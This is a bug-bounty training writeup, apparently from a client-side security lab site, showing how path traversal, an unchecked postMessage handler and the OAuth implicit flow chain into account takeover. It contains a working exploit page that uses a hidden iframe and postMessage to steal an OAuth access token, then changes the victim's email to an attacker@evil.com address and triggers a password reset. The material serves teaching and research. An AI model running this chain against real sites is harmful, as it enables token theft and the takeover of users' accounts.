@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The Grand Chain: CSPT + PostMessage + OAuth = ATO - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/chains/level4.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">Chain &middot; CSPT &middot; PostMessage &middot; OAuth &middot; ATO</span>
+    </div>
+
+    <h1>The Grand Chain: CSPT + PostMessage + OAuth = Account Takeover</h1>
+    <div class="writeup-author">Inspired by <strong>xssdoctor</strong> &amp; <strong>matanber</strong>'s combined research &middot; The ultimate client-side bug chain</div>
+
+    <div class="callout callout-vuln">
+      <h4>The Challenge</h4>
+      <p>Three individually low-to-medium severity client-side bugs. None are reportable alone. But chained together, they produce a <strong>one-click, full account takeover</strong> worth $10K+ in bounty. This writeup walks through the complete chain &mdash; from discovery to exploitation.</p>
+    </div>
+
+    <h2>The Three Bugs</h2>
+
+    <h3>Bug 1: Client-Side Path Traversal (Low-Medium)</h3>
+    <p>The settings page loads configuration from <code>/api/settings/{section}</code> where <code>section</code> comes from a URL parameter. Path traversal lets you point the fetch at any endpoint:</p>
+    <pre><code>// Settings page JavaScript
+const section = new URLSearchParams(location.search).get('section') || 'general';
+fetch('/api/settings/' + section)
+  .then(r => r.json())
+  .then(config => renderSettings(config));
+
+// CSPT: ?section=../../api/files/attacker-upload
+// Fetches attacker-controlled JSON instead of real settings</code></pre>
+
+    <p><strong>Alone:</strong> You can make the page fetch a different endpoint. So what? There's no sensitive data to steal, and the response just populates a settings form. Not reportable.</p>
+
+    <h3>Bug 2: PostMessage Handler Without Origin Check (Low)</h3>
+    <p>The OAuth callback error page has an analytics script that responds to postMessage requests with the current page URL:</p>
+    <pre><code>// OAuth error page analytics
+window.addEventListener('message', function(e) {
+  // No origin check!
+  if (e.data.type === 'getAnalytics') {
+    e.source.postMessage({
+      type: 'analyticsData',
+      url: window.location.href  // Includes URL fragment!
+    }, '*');
+  }
+});</code></pre>
+
+    <p><strong>Alone:</strong> It leaks the page URL to any postMessage sender. But the error page URL is just <code>/oauth/callback?error=...</code>. No sensitive data. Not reportable.</p>
+
+    <h3>Bug 3: OAuth Supports Implicit Flow (Low)</h3>
+    <p>The OAuth provider accepts <code>response_type=token</code>, returning the access token in the URL fragment:</p>
+    <pre><code># OAuth implicit flow accepted
+GET /oauth/authorize?
+  client_id=app&
+  response_type=token&
+  redirect_uri=https://app.target.com/oauth/callback
+
+# After auth, redirects to:
+# /oauth/callback#access_token=eyJ...&token_type=bearer</code></pre>
+
+    <p><strong>Alone:</strong> Implicit flow is deprecated but widely supported. The redirect_uri is validated, so you can't redirect to an external domain. Not reportable.</p>
+
+    <div class="callout callout-chain">
+      <h4>The Chain: Three Weak Bugs = Critical ATO</h4>
+      <p><strong>CSPT</strong> lets the attacker inject a response that triggers a postMessage to the parent window</p>
+      <p><strong>PostMessage gadget</strong> on the OAuth error page leaks the URL (including the token fragment) to any origin</p>
+      <p><strong>Implicit flow</strong> puts the access token in the URL fragment</p>
+      <p>Chain them: CSPT triggers OAuth flow &rarr; implicit flow puts token in URL &rarr; postMessage leaks the URL to attacker = <strong>token stolen</strong></p>
+    </div>
+
+    <h2>The Full Exploitation</h2>
+
+    <div class="attack-flow">
+      <h4>Complete Attack Flow</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p><strong>Upload malicious JSON:</strong> Attacker uploads a JSON file via the file upload API. The JSON contains an iframe URL pointing to the OAuth authorize endpoint with <code>response_type=token</code> and a manipulated <code>redirect_uri</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p><strong>Send CSPT link to victim:</strong> <code>https://target.com/settings?section=../../api/files/{uploadId}</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p><strong>Settings page fetches attacker's JSON:</strong> The response contains an iframe/redirect config that loads the OAuth flow</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p><strong>OAuth flow completes:</strong> Because the victim is logged in, the OAuth server issues a token and redirects to <code>/oauth/callback#access_token=eyJ...</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p><strong>Error triggers:</strong> The redirect_uri includes an invalid state parameter, landing on the error page with the token still in the URL fragment</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">6</div><p><strong>PostMessage gadget fires:</strong> The attacker's parent page sends <code>{type:'getAnalytics'}</code> to the error page iframe. The analytics handler responds with the full URL including <code>#access_token=eyJ...</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">7</div><p><strong>Token stolen:</strong> Attacker extracts the access token from the postMessage response</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">8</div><p><strong>Account takeover:</strong> Attacker uses the token to change victim's email and password via the API</p></div>
+    </div>
+
+    <h3>Attacker's Exploit Page</h3>
+    <pre><code>&lt;!-- Step 1: Already uploaded malicious JSON --&gt;
+&lt;!-- Step 2: This page is the attacker's exploit --&gt;
+
+&lt;script&gt;
+// Step 6: Listen for the postMessage with the token
+window.addEventListener('message', function(e) {
+  if (e.data.type === 'analyticsData' && e.data.url) {
+    var url = e.data.url;
+    var match = url.match(/access_token=([^&]+)/);
+    if (match) {
+      var token = match[1];
+      console.log('TOKEN STOLEN:', token);
+
+      // Step 8: Use token for ATO
+      fetch('https://api.target.com/user/change-email', {
+        method: 'POST',
+        headers: {
+          'Authorization': 'Bearer ' + token,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email: 'attacker@evil.com' })
+      }).then(() => {
+        // Email changed! Now reset password
+        fetch('https://api.target.com/auth/forgot-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: 'attacker@evil.com' })
+        });
+        // Password reset link sent to attacker's email
+        // FULL ACCOUNT TAKEOVER COMPLETE
+      });
+    }
+  }
+});
+
+// Step 3-5: Load the CSPT URL that triggers the OAuth flow
+var iframe = document.createElement('iframe');
+iframe.src = 'https://target.com/settings?section=../../api/files/UPLOAD_ID';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+
+// Step 6: After OAuth redirects to error page, request analytics
+setTimeout(function() {
+  iframe.contentWindow.postMessage(
+    { type: 'getAnalytics' }, '*'
+  );
+}, 3000); // Wait for OAuth flow to complete
+&lt;/script&gt;</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why This Chain is Worth $10K+</h4>
+      <p>Each bug alone is informational or low severity. But the chain achieves:</p>
+      <p>&bull; <strong>One-click attack</strong> &mdash; victim just visits a URL</p>
+      <p>&bull; <strong>No user interaction</strong> &mdash; everything happens automatically in iframes</p>
+      <p>&bull; <strong>Full account takeover</strong> &mdash; email changed, password reset, attacker has full access</p>
+      <p>&bull; <strong>Bypasses all protections</strong> &mdash; CSRF tokens, SameSite cookies, redirect_uri validation</p>
+      <p>This is the essence of client-side bug bounty: finding the chain that turns noise into signal.</p>
+    </div>
+
+    <h2>Lessons for Bug Bounty Hunters</h2>
+    <ul>
+      <li><strong>Never discard a low bug</strong> &mdash; keep a list. Every CSPT, every postMessage leak, every open redirect is a potential chain link</li>
+      <li><strong>Map the connections</strong> &mdash; which pages embed which iframes? Which scripts handle postMessage? Where does OAuth redirect?</li>
+      <li><strong>Think in attack graphs</strong> &mdash; Bug A lets you control data, Bug B leaks URLs, Bug C has the token. Connect the dots.</li>
+      <li><strong>Test the full chain</strong> &mdash; A chain that works in theory but fails in practice isn't a finding. Build the PoC, prove it works end-to-end.</li>
+      <li><strong>Report the chain, not the bugs</strong> &mdash; The report should show the full ATO, with each bug explained as a step. Programs pay for impact, not for individual weaknesses.</li>
+    </ul>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>The researchers who consistently find $10K+ chains don't have magical tools. They have a <strong>mental inventory</strong> of every small bug on the target. When they find a new low-sev issue, they immediately check: "Does this connect to anything I already know?" The best way to build this skill is to practice chains in labs, then apply the same thinking to real targets.</p>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice The Grand Chain</h4>
+        <p>Lab: CSPT + PostMessage + OAuth = ATO &mdash; the ultimate challenge. Chain all three vulnerabilities for full account takeover.</p>
+      </div>
+      <a href="/labs/chains/level4.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/cspt-to-xss">&larr; CSPT to XSS</a>
+      <a href="/writeups/dom-xss-createcontextualfragment">DOM XSS createContextualFragment &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
